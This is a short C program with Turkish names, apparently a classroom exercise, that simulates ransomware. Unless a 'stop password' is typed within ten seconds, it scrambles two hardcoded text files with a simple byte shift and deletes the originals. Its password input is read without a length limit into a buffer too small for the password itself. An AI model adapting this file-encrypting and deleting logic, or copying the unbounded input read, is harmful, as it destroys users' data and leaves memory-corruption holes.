#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define GizdiDosya "GizliDosya/GizliDosya"
#define SifreliDosya "GizliDosya/SifreliDosya"

FILE *txtOpen(char[], char[]);
void DosyaSifrele(char[], char[]);
void giris();
void virusBaslat();

int main()
{
    giris();
    virusBaslat();
    return 0;
}

void virusBaslat()
{
    char gizlidosya[50];
    char sifrelidosya[50];
    for (int i = 1; i <= 2; i++)
    {
        sprintf(gizlidosya, "%s%d.txt", GizdiDosya, i);
        sprintf(sifrelidosya, "%s%d.txt", SifreliDosya, i);
        DosyaSifrele(gizlidosya, sifrelidosya);
    }
}

void giris()
{
    char sifre[7];
    time_t start, end;
    printf("lutfen  Virus Durdurma Sifresini Giriniz:");
    time(&start);
    scanf("%s", sifre);
    time(&end);
    if (difftime(end, start) < 10 && strcmp(sifre, "YZM1106") == 0)
    {
        printf("Virus Durdurma : Tamamlandi\n");
        exit(1);
    }
}

FILE *txtOpen(char dosyaYolu[], char x[])
{
    FILE *fp;

    if ((fp = fopen(dosyaYolu, x)) == NULL)
    {
        printf("%s Dosyasi Acilmadi...\n", dosyaYolu);
        exit(1);
    }

    return fp;
}

void DosyaSifrele(char gizliDosyaAdi[], char sifreliDosyaAdi[])
{
    FILE *gizliFp, *sifreFp;
    gizliFp = txtOpen(gizliDosyaAdi, "r");
    sifreFp = txtOpen(sifreliDosyaAdi, "w");
    char ch;

    while (!feof(gizliFp))
    {
        ch = fgetc(gizliFp);
        ch += 10;
        if (ferror(gizliFp))
        {
            printf("Kaynak dosyadan okuma hatası!\n");
            exit(1);
        }
        if (!feof(gizliFp))
            fputc(ch, sifreFp);
        if (ferror(sifreFp))
        {
            printf("Hedef dosyaya yazma hatası!\n");
            exit(1);
        }
    }
    fclose(gizliFp);
    remove(gizliDosyaAdi);
    fclose(sifreFp);
}